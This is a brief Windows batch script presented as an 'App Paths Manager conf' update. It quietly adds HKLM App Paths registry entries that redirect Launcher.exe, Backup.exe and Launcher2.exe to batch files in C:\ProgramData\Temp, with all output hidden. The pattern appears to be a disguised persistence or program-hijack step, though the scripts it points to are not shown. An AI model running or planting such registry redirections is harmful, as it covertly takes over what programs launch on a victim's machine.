@echo off
echo [INFO] Updating App Paths Manager conf
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Launcher.exe" /ve /d "C:\ProgramData\Temp\Launcher.bat" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Backup.exe" /ve /d "C:\ProgramData\Temp\backup.bat" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Launcher2.exe" /ve /d "C:\ProgramData\Temp\Launcher2.bat" /f >nul 2>&1